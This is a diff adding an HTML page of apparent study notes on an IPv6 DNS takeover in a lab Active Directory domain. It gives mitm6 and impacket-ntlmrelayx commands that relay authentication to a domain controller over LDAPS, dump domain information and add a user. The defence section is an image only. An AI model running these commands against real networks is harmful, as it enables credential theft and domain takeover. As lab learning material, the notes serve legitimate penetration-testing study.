@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>IPv6 attacks</title>
+</head><body>if ipv6 is turned on but we are only using ipv4<br/>
+then who is doing dns for ipv6<br/>
+answer is :nobody<br/>
+<br/>
+so what we do on attacker machine is listen for all ipv6 messages<br/>
+attack machine will act like dns for ipv6<br/>
+<br/>
+when this happens,we can get authentication control to Domain Controller via LDAP or SMB<br/>
+<br/>
+LDAP:The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network.<br/>
+<br/>
+<br/>
+IPv6 DNS takeover via mitm6<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+#mitm6 -d marvel.local<br/>
+-d:domain<br/>
+<br/>
+#impacket-ntlmrelayx -6 -t ldaps://&lt;domain controller ip&gt; -wh fakewpad.marvel.local -l lootme<br/>
+-t :target<br/>
+-6:only ipv6<br/>
+ldaps:ldap secure<br/>
+<br/>
+now reboot any 1 of the windows 10 enterprise(eitther punisher or spiderman)<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+says domain info dumped to loot directory<br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+#firefox domain_users_by_group.html<br/>
+<img src="image 4.png" /><br/>
+<br/>
+<br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+description tells password:so dont write pssword in description<br/>
+<br/>
+also adds a new user<br/>
+<br/>
+<br/>
+<img src="image 6.png" /><br/>
+<br/>
+<img src="image 7.png" /><br/>
+---------------Defend against IPv6 attacks------------------<br/>
+<br/>
+<img src="image 8.png" /><br/>
+<br/>
+</body></html>
